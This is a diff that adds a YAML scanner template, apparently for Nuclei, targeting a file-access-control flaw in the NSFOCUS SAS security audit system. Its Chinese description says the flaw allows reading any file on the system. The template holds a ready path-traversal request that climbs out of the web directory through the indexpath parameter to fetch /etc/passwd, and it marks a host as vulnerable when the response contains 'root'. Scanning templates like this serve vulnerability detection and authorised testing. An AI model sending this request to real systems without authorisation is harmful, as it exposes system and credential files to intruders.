@@ -1,0 +1,25 @@
+id: nsfocus-sas-file-read
+
+info:
+  name: 绿盟SAS安全审计系统文件访问控制缺陷
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    漏洞描述：绿盟SAS安全审计系统因文件访问控制机制存在缺陷，攻击者可利用该缺陷读取系统内任意文件内容。
+      影响范围：系统内所有可通过路径参数访问的文件资源。
+      利用方式：通过构造特殊路径参数实现非授权文件访问。
+  tags: 绿盟SAS安全审计系统
+
+http:
+- raw:
+  - |
+    GET /webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root'
